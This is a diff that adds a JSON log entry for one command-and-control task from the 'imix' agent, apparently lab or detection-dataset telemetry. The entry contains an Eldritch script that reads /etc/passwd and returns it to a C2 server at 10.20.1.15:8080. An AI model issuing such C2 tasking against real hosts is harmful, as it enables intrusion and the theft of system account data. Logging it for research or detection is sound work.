@@ -1,0 +1,32 @@
+{
+  "container_id": null,
+  "c2_framework": "imix",
+  "start_time": "2026-01-27T16:20:32.152417",
+  "end_time": "2026-01-27T16:21:33.139329",
+  "total_tasks": 1,
+  "total_commands": 0,
+  "tasks": [
+    {
+      "task_id": 42949673397,
+      "timestamp": "2026-01-27T16:21:24.473924",
+      "eldritch_script": "def cat(path):\n    if file.is_file(path):\n        res = file.read(path)\n        print(res)\n    else:\n        eprint(f\"Error: Invalid Path '{path}'\")\n\n    return\n\ntime.sleep(5)\ncat(input_params['path'])\n",
+      "transport": "grpc",
+      "extracted_commands": [],
+      "metadata": {
+        "id": 42949673397,
+        "quest_name": "The Rescue from the Ravenous Raptor",
+        "tome": {
+          "eldritch": "def cat(path):\n    if file.is_file(path):\n        res = file.read(path)\n        print(res)\n    else:\n        eprint(f\"Error: Invalid Path '{path}'\")\n\n    return\n\ntime.sleep(5)\ncat(input_params['path'])\n",
+          "parameters": {
+            "path": "/etc/passwd"
+          },
+          "file_names": []
+        }
+      },
+      "c2_server": "grpc://10.20.1.15:8080",
+      "c2_ip": "10.20.1.15",
+      "c2_port": 8080,
+      "c2_endpoint": "10.20.1.15:8080"
+    }
+  ]
+}
